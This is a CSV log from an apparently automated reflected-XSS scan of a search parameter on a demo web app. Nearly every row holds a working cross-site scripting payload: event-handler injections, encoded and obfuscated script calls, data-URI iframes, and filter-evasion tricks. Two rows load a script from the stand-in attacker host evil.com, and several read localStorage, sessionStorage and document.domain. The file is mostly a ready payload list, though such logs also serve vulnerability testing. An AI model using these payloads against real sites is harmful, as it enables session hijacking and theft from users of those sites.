Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 17:59:09.773,2026-01-10 17:59:11.776,2.003,https://demo-knsl.onrender.com/search,GET,q,<a href=vbscript:msgbox(1)>X</a>,RAW_REFLECTION,No,,High
2026-01-10 17:59:09.773,2026-01-10 17:59:11.776,2.003,https://demo-knsl.onrender.com/search,GET,q,<a href=about:blank>X</a>,RAW_REFLECTION,No,,High
2026-01-10 17:59:09.773,2026-01-10 17:59:11.776,2.003,https://demo-knsl.onrender.com/search,GET,q,<img dynsrc=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:09.847,2026-01-10 17:59:11.849,2.002,https://demo-knsl.onrender.com/search,GET,q,"<input pattern="".*"" title=""test"" onmouseover=alert(1)>",RAW_REFLECTION,No,,High
2026-01-10 17:59:09.993,2026-01-10 17:59:11.996,2.003,https://demo-knsl.onrender.com/search,GET,q,"<input placeholder=""test"" onmouseover=alert(1)>",RAW_REFLECTION,No,,High
2026-01-10 17:59:10.775,2026-01-10 17:59:12.778,2.003,https://demo-knsl.onrender.com/search,GET,q,"<div title=""test"" onmouseover=alert(1)>X</div>",RAW_REFLECTION,No,,High
2026-01-10 17:59:10.775,2026-01-10 17:59:12.778,2.003,https://demo-knsl.onrender.com/search,GET,q,"<img alt=""test"" src=x onerror=alert(1)>",RAW_REFLECTION,No,,High
2026-01-10 17:59:10.775,2026-01-10 17:59:12.778,2.003,https://demo-knsl.onrender.com/search,GET,q,<blockquote cite=javascript:alert(1)>X</blockquote>,RAW_REFLECTION,No,,High
2026-01-10 17:59:10.848,2026-01-10 17:59:12.850,2.002,https://demo-knsl.onrender.com/search,GET,q,<img longdesc=javascript:alert(1) src=x>,RAW_REFLECTION,No,,High
2026-01-10 17:59:10.994,2026-01-10 17:59:12.997,2.002,https://demo-knsl.onrender.com/search,GET,q,<img usemap=#x src=x><map name=x><area onclick=alert(1)></map>,RAW_REFLECTION,No,,High
2026-01-10 17:59:11.776,2026-01-10 17:59:13.778,2.002,https://demo-knsl.onrender.com/search,GET,q,<svg><script>alert&#40;1&#41;</script></svg>,RAW_REFLECTION,No,,High
2026-01-10 17:59:11.776,2026-01-10 17:59:13.778,2.002,https://demo-knsl.onrender.com/search,GET,q,<input dirname=test onchange=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:11.776,2026-01-10 17:59:13.778,2.002,https://demo-knsl.onrender.com/search,GET,q,<img ismap src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:11.849,2026-01-10 17:59:13.851,2.002,https://demo-knsl.onrender.com/search,GET,q,<svg><script>alert&#x28;1&#x29;</script></svg>,RAW_REFLECTION,No,,High
2026-01-10 17:59:11.996,2026-01-10 17:59:13.998,2.001,https://demo-knsl.onrender.com/search,GET,q,<svg><script>&#97;lert(1)</script></svg>,RAW_REFLECTION,No,,High
2026-01-10 17:59:12.778,2026-01-10 17:59:14.780,2.002,https://demo-knsl.onrender.com/search,GET,q,"<div style=""xss:expression(alert(1))"">X</div>",RAW_REFLECTION,No,,High
2026-01-10 17:59:12.778,2026-01-10 17:59:14.780,2.002,https://demo-knsl.onrender.com/search,GET,q,"<div style=""background:expression(alert(1))"">X</div>",RAW_REFLECTION,No,,High
2026-01-10 17:59:12.778,2026-01-10 17:59:14.780,2.002,https://demo-knsl.onrender.com/search,GET,q,"<script type=importmap>{""imports"":{""x"":""javascript:alert(1)""}}</script>",RAW_REFLECTION,No,,High
2026-01-10 17:59:12.850,2026-01-10 17:59:14.853,2.002,https://demo-knsl.onrender.com/search,GET,q,<div id=x><template shadowroot=open><style>*{color:red}</style><img src=x onerror=alert(1)></template></div>,RAW_REFLECTION,No,,High
2026-01-10 17:59:12.997,2026-01-10 17:59:14.998,2.002,https://demo-knsl.onrender.com/search,GET,q,"<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,No,,High
2026-01-10 17:59:13.778,2026-01-10 17:59:15.781,2.002,https://demo-knsl.onrender.com/search,GET,q,"<embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,No,,High
2026-01-10 17:59:13.778,2026-01-10 17:59:15.781,2.002,https://demo-knsl.onrender.com/search,GET,q,<image src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:13.778,2026-01-10 17:59:15.781,2.002,https://demo-knsl.onrender.com/search,GET,q,"<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",RAW_REFLECTION,No,,High
2026-01-10 17:59:13.851,2026-01-10 17:59:15.854,2.003,https://demo-knsl.onrender.com/search,GET,q,<isindex type=submit value=X onclick=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:13.998,2026-01-10 17:59:15.999,2.002,https://demo-knsl.onrender.com/search,GET,q,<bgsound src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:14.780,2026-01-10 17:59:16.781,2.002,https://demo-knsl.onrender.com/search,GET,q,<applet code=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:14.780,2026-01-10 17:59:16.781,2.002,https://demo-knsl.onrender.com/search,GET,q,<script>al\x65rt(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:14.780,2026-01-10 17:59:16.781,2.002,https://demo-knsl.onrender.com/search,GET,q,<script>al\u0065rt(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:14.853,2026-01-10 17:59:16.855,2.003,https://demo-knsl.onrender.com/search,GET,q,<script>eval('al'+'ert(1)')</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:16.781,2026-01-10 17:59:16.857,0.076,https://demo-knsl.onrender.com/search,GET,q,&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;,NO_REFLECTION,No,,Info
2026-01-10 17:59:14.998,2026-01-10 17:59:17.001,2.002,https://demo-knsl.onrender.com/search,GET,q,<script>eval('al\x65rt(1)')</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:15.781,2026-01-10 17:59:17.783,2.002,https://demo-knsl.onrender.com/search,GET,q,<script>[1].find(alert)</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:15.781,2026-01-10 17:59:17.783,2.002,https://demo-knsl.onrender.com/search,GET,q,<script>top['al'+'ert'](1)</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:15.781,2026-01-10 17:59:17.783,2.002,https://demo-knsl.onrender.com/search,GET,q,<script>top[/al/.source+/ert/.source](1)</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:15.854,2026-01-10 17:59:17.856,2.002,https://demo-knsl.onrender.com/search,GET,q,<script>top[8680439..toString(30)](1)</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:15.999,2026-01-10 17:59:18.001,2.002,https://demo-knsl.onrender.com/search,GET,q,&lt;script&gt;alert(1)&lt;/script&gt;,RAW_REFLECTION,No,,High
2026-01-10 17:59:16.781,2026-01-10 17:59:18.784,2.003,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1)</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:16.855,2026-01-10 17:59:18.784,1.929,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:16.781,2026-01-10 17:59:18.785,2.003,https://demo-knsl.onrender.com/search,GET,q,&#60;script&#62;alert(1)&#60;/script&#62;,RAW_REFLECTION,No,,High
2026-01-10 17:59:16.857,2026-01-10 17:59:18.858,2.000,https://demo-knsl.onrender.com/search,GET,q,<script/src=//evil.com></script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:17.001,2026-01-10 17:59:19.003,2.002,https://demo-knsl.onrender.com/search,GET,q,<script	src=//evil.com></script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:17.783,2026-01-10 17:59:19.785,2.003,https://demo-knsl.onrender.com/search,GET,q,<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>,RAW_REFLECTION,No,,High
2026-01-10 17:59:17.783,2026-01-10 17:59:19.786,2.003,https://demo-knsl.onrender.com/search,GET,q,<script,RAW_REFLECTION,No,,High
2026-01-10 17:59:17.783,2026-01-10 17:59:19.786,2.003,https://demo-knsl.onrender.com/search,GET,q,src=//evil.com></script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:17.856,2026-01-10 17:59:19.859,2.003,https://demo-knsl.onrender.com/search,GET,q,<noscript><iframe></noscript><img src=x onerror=alert(1)></iframe></noscript>,RAW_REFLECTION,No,,High
2026-01-10 17:59:18.001,2026-01-10 17:59:20.004,2.003,https://demo-knsl.onrender.com/search,GET,q,<listing>&lt;img src=x onerror=alert(1)&gt;</listing>,RAW_REFLECTION,No,,High
2026-01-10 17:59:18.784,2026-01-10 17:59:20.787,2.002,https://demo-knsl.onrender.com/search,GET,q,<textarea>&lt;img src=x onerror=alert(1)&gt;</textarea>,RAW_REFLECTION,No,,High
2026-01-10 17:59:18.785,2026-01-10 17:59:20.787,2.002,https://demo-knsl.onrender.com/search,GET,q,<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>,RAW_REFLECTION,No,,High
2026-01-10 17:59:18.784,2026-01-10 17:59:20.787,2.002,https://demo-knsl.onrender.com/search,GET,q,<xmp>&lt;img src=x onerror=alert(1)&gt;</xmp>,RAW_REFLECTION,No,,High
2026-01-10 17:59:18.858,2026-01-10 17:59:20.860,2.002,https://demo-knsl.onrender.com/search,GET,q,<svg><foreignObject><script>alert(1)</script></foreignObject></svg>,RAW_REFLECTION,No,,High
2026-01-10 17:59:19.003,2026-01-10 17:59:21.005,2.002,https://demo-knsl.onrender.com/search,GET,q,<template><slot onfocus=alert(1) autofocus></slot></template>,RAW_REFLECTION,No,,High
2026-01-10 17:59:19.786,2026-01-10 17:59:21.789,2.003,https://demo-knsl.onrender.com/search,GET,q,<input type=password onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 17:59:19.785,2026-01-10 17:59:21.789,2.003,https://demo-knsl.onrender.com/search,GET,q,<input type=text onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 17:59:19.786,2026-01-10 17:59:21.789,2.003,https://demo-knsl.onrender.com/search,GET,q,<input type=email onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 17:59:19.859,2026-01-10 17:59:21.862,2.002,https://demo-knsl.onrender.com/search,GET,q,<input type=number onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 17:59:21.789,2026-01-10 17:59:21.867,0.078,https://demo-knsl.onrender.com/search,GET,q,<input type=month onfocus=alert(1) autofocus>,NO_REFLECTION,No,,Info
2026-01-10 17:59:21.867,2026-01-10 17:59:21.927,0.061,https://demo-knsl.onrender.com/search,GET,q,<input type=button onclick=alert(1) value=X>,NO_REFLECTION,No,,Info
2026-01-10 17:59:20.004,2026-01-10 17:59:22.006,2.002,https://demo-knsl.onrender.com/search,GET,q,<input type=search onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 17:59:20.787,2026-01-10 17:59:22.790,2.003,https://demo-knsl.onrender.com/search,GET,q,<input type=url onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 17:59:20.787,2026-01-10 17:59:22.790,2.003,https://demo-knsl.onrender.com/search,GET,q,<input type=date onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 17:59:20.787,2026-01-10 17:59:22.790,2.003,https://demo-knsl.onrender.com/search,GET,q,<input type=tel onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 17:59:20.860,2026-01-10 17:59:22.863,2.003,https://demo-knsl.onrender.com/search,GET,q,<input type=time onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 17:59:22.790,2026-01-10 17:59:22.965,0.176,https://demo-knsl.onrender.com/search,GET,q,<input list=x><datalist id=x><option onclick=alert(1)>X</option></datalist>,NO_REFLECTION,No,,Info
2026-01-10 17:59:21.005,2026-01-10 17:59:23.008,2.003,https://demo-knsl.onrender.com/search,GET,q,<input type=datetime-local onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 17:59:21.789,2026-01-10 17:59:23.792,2.003,https://demo-knsl.onrender.com/search,GET,q,<input type=week onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 17:59:21.789,2026-01-10 17:59:23.792,2.003,https://demo-knsl.onrender.com/search,GET,q,<input type=color onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 17:59:21.862,2026-01-10 17:59:23.792,1.930,https://demo-knsl.onrender.com/search,GET,q,<input type=range onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 17:59:21.927,2026-01-10 17:59:23.864,1.937,https://demo-knsl.onrender.com/search,GET,q,<input type=reset onclick=alert(1) value=X>,RAW_REFLECTION,No,,High
2026-01-10 17:59:23.792,2026-01-10 17:59:23.873,0.082,https://demo-knsl.onrender.com/search,GET,q,<img crossorigin=anonymous src=x onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-10 17:59:23.864,2026-01-10 17:59:23.924,0.059,https://demo-knsl.onrender.com/search,GET,q,<script crossorigin=anonymous src=x onerror=alert(1)></script>,NO_REFLECTION,No,,Info
2026-01-10 17:59:22.006,2026-01-10 17:59:24.009,2.003,https://demo-knsl.onrender.com/search,GET,q,<input type=submit onclick=alert(1) value=X>,RAW_REFLECTION,No,,High
2026-01-10 17:59:22.790,2026-01-10 17:59:24.792,2.003,https://demo-knsl.onrender.com/search,GET,q,<datalist onmouseover=alert(1)>X</datalist>,RAW_REFLECTION,No,,High
2026-01-10 17:59:22.863,2026-01-10 17:59:24.793,1.930,https://demo-knsl.onrender.com/search,GET,q,<keygen onchange=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:22.790,2026-01-10 17:59:24.793,2.003,https://demo-knsl.onrender.com/search,GET,q,<keygen onfocus=alert(1) autofocus>,RAW_REFLECTION,No,,High
2026-01-10 17:59:22.965,2026-01-10 17:59:24.866,1.901,https://demo-knsl.onrender.com/search,GET,q,<custom-element onclick=alert(1)>X</custom-element>,RAW_REFLECTION,No,,High
2026-01-10 17:59:23.008,2026-01-10 17:59:25.010,2.002,https://demo-knsl.onrender.com/search,GET,q,<img srcset=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:23.792,2026-01-10 17:59:25.794,2.002,https://demo-knsl.onrender.com/search,GET,q,"<img sizes=""100vw"" srcset=x onerror=alert(1)>",RAW_REFLECTION,No,,High
2026-01-10 17:59:23.792,2026-01-10 17:59:25.794,2.003,https://demo-knsl.onrender.com/search,GET,q,<source srcset=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:23.873,2026-01-10 17:59:25.794,1.921,https://demo-knsl.onrender.com/search,GET,q,"<script integrity=""sha384-x"" src=x onerror=alert(1)></script>",RAW_REFLECTION,No,,High
2026-01-10 17:59:23.924,2026-01-10 17:59:25.868,1.944,https://demo-knsl.onrender.com/search,GET,q,<img referrerpolicy=no-referrer src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:24.009,2026-01-10 17:59:26.012,2.003,https://demo-knsl.onrender.com/search,GET,q,<img loading=lazy src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:24.793,2026-01-10 17:59:26.794,2.002,https://demo-knsl.onrender.com/search,GET,q,<img importance=high src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:24.792,2026-01-10 17:59:26.796,2.003,https://demo-knsl.onrender.com/search,GET,q,<img decoding=async src=x onerror=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:24.793,2026-01-10 17:59:26.796,2.003,https://demo-knsl.onrender.com/search,GET,q,<img src=x onabort=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:24.866,2026-01-10 17:59:26.869,2.003,https://demo-knsl.onrender.com/search,GET,q,<img src=x onwaiting=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:25.010,2026-01-10 17:59:27.014,2.004,https://demo-knsl.onrender.com/search,GET,q,<img src=x onseeking=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:25.794,2026-01-10 17:59:27.795,2.001,https://demo-knsl.onrender.com/search,GET,q,<img src=x onplay=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:25.794,2026-01-10 17:59:27.797,2.003,https://demo-knsl.onrender.com/search,GET,q,<img src=x onseeked=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:25.794,2026-01-10 17:59:27.797,2.003,https://demo-knsl.onrender.com/search,GET,q,<img src=x onplaying=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:25.868,2026-01-10 17:59:27.870,2.002,https://demo-knsl.onrender.com/search,GET,q,<img src=x onpause=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:26.012,2026-01-10 17:59:28.016,2.004,https://demo-knsl.onrender.com/search,GET,q,<img src=x onloadstart=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:26.796,2026-01-10 17:59:28.797,2.002,https://demo-knsl.onrender.com/search,GET,q,<img src=x onloadeddata=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:26.796,2026-01-10 17:59:28.798,2.002,https://demo-knsl.onrender.com/search,GET,q,<img src=x onended=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:26.794,2026-01-10 17:59:28.798,2.003,https://demo-knsl.onrender.com/search,GET,q,<img src=x onloadedmetadata=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:26.869,2026-01-10 17:59:28.871,2.002,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondurationchange=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:27.014,2026-01-10 17:59:29.018,2.004,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncanplaythrough=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:27.795,2026-01-10 17:59:29.798,2.003,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncanplay=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:27.797,2026-01-10 17:59:29.798,2.001,https://demo-knsl.onrender.com/search,GET,q,"<iframe sandbox=allow-scripts srcdoc=""<script>alert(1)</script>"">",RAW_REFLECTION,No,,High
2026-01-10 17:59:27.797,2026-01-10 17:59:29.798,2.001,https://demo-knsl.onrender.com/search,GET,q,"<iframe sandbox=allow-scripts src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,No,,High
2026-01-10 17:59:27.870,2026-01-10 17:59:29.873,2.003,https://demo-knsl.onrender.com/search,GET,q,<root><![CDATA[<script>alert(1)</script>]]></root>,RAW_REFLECTION,No,,High
2026-01-10 17:59:28.016,2026-01-10 17:59:30.020,2.004,https://demo-knsl.onrender.com/search,GET,q,<script>alert(document.domain)</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:30.020,2026-01-10 17:59:30.088,0.068,https://demo-knsl.onrender.com/search,GET,q,<acronym onmouseover=alert(1)>X</acronym>,NO_REFLECTION,No,,Info
2026-01-10 17:59:28.797,2026-01-10 17:59:30.800,2.002,https://demo-knsl.onrender.com/search,GET,q,<script>alert(window.location)</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:28.798,2026-01-10 17:59:30.800,2.002,https://demo-knsl.onrender.com/search,GET,q,<script>alert(localStorage.getItem('test'))</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:28.798,2026-01-10 17:59:30.800,2.002,https://demo-knsl.onrender.com/search,GET,q,<script>alert(navigator.userAgent)</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:28.871,2026-01-10 17:59:30.874,2.003,https://demo-knsl.onrender.com/search,GET,q,<script>alert(sessionStorage.getItem('test'))</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:30.800,2026-01-10 17:59:30.900,0.100,https://demo-knsl.onrender.com/search,GET,q,<font onmouseover=alert(1)>X</font>,NO_REFLECTION,No,,Info
2026-01-10 17:59:29.018,2026-01-10 17:59:31.021,2.003,https://demo-knsl.onrender.com/search,GET,q,<script>'alert\u0028document.domain\u0029'</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:29.798,2026-01-10 17:59:31.801,2.003,https://demo-knsl.onrender.com/search,GET,q,<script>alert(window.chrome)</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:29.798,2026-01-10 17:59:31.801,2.003,https://demo-knsl.onrender.com/search,GET,q,<script>alert(window.safari)</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:29.798,2026-01-10 17:59:31.801,2.003,https://demo-knsl.onrender.com/search,GET,q,<script>alert(window.name)</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:29.873,2026-01-10 17:59:31.875,2.002,https://demo-knsl.onrender.com/search,GET,q,<blink onmouseover=alert(1)>X</blink>,RAW_REFLECTION,No,,High
2026-01-10 17:59:30.088,2026-01-10 17:59:32.023,1.936,https://demo-knsl.onrender.com/search,GET,q,<big onmouseover=alert(1)>X</big>,RAW_REFLECTION,No,,High
2026-01-10 17:59:30.800,2026-01-10 17:59:32.802,2.003,https://demo-knsl.onrender.com/search,GET,q,<dir onmouseover=alert(1)>X</dir>,RAW_REFLECTION,No,,High
2026-01-10 17:59:30.800,2026-01-10 17:59:32.802,2.003,https://demo-knsl.onrender.com/search,GET,q,<center onmouseover=alert(1)>X</center>,RAW_REFLECTION,No,,High
2026-01-10 17:59:30.874,2026-01-10 17:59:32.802,1.928,https://demo-knsl.onrender.com/search,GET,q,<frame onload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:30.900,2026-01-10 17:59:32.876,1.977,https://demo-knsl.onrender.com/search,GET,q,<frameset onload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:31.021,2026-01-10 17:59:33.024,2.003,https://demo-knsl.onrender.com/search,GET,q,<noframes onload=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:59:31.801,2026-01-10 17:59:33.803,2.002,https://demo-knsl.onrender.com/search,GET,q,<tt onmouseover=alert(1)>X</tt>,RAW_REFLECTION,No,,High
2026-01-10 17:59:31.801,2026-01-10 17:59:33.804,2.002,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1);alert(2);alert(3)</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:31.801,2026-01-10 17:59:33.804,2.002,https://demo-knsl.onrender.com/search,GET,q,<strike onmouseover=alert(1)>X</strike>,RAW_REFLECTION,No,,High
2026-01-10 17:59:31.875,2026-01-10 17:59:33.878,2.003,https://demo-knsl.onrender.com/search,GET,q,<script>for(i=0;i<3;i++){alert(i)}</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:32.023,2026-01-10 17:59:34.026,2.003,https://demo-knsl.onrender.com/search,GET,q,<script>while(1){alert(1);break}</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:32.802,2026-01-10 17:59:34.805,2.003,https://demo-knsl.onrender.com/search,GET,q,<script>if(1){alert(1)}</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:32.802,2026-01-10 17:59:34.805,2.003,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1)||alert(2)</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:32.802,2026-01-10 17:59:34.805,2.003,https://demo-knsl.onrender.com/search,GET,q,<script>try{alert(1)}catch(e){}</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:32.876,2026-01-10 17:59:34.879,2.003,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1)&&alert(2)</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:33.024,2026-01-10 17:59:35.027,2.003,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1)?alert(2):alert(3)</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:33.803,2026-01-10 17:59:35.806,2.003,https://demo-knsl.onrender.com/search,GET,q,"<script>alert([1,2,3])</script>",RAW_REFLECTION,No,,High
2026-01-10 17:59:33.804,2026-01-10 17:59:35.806,2.003,https://demo-knsl.onrender.com/search,GET,q,<script>alert(function(){return 1}())</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:33.804,2026-01-10 17:59:35.806,2.003,https://demo-knsl.onrender.com/search,GET,q,"<script>alert({x:1,y:2})</script>",RAW_REFLECTION,No,,High
2026-01-10 17:59:33.878,2026-01-10 17:59:35.880,2.003,https://demo-knsl.onrender.com/search,GET,q,<script>alert((()=>1)())</script>,RAW_REFLECTION,No,,High
2026-01-10 17:59:34.026,2026-01-10 17:59:36.029,2.002,https://demo-knsl.onrender.com/search,GET,q,<script>alert(class{constructor(){return 1}})</script>,RAW_REFLECTION,No,,High
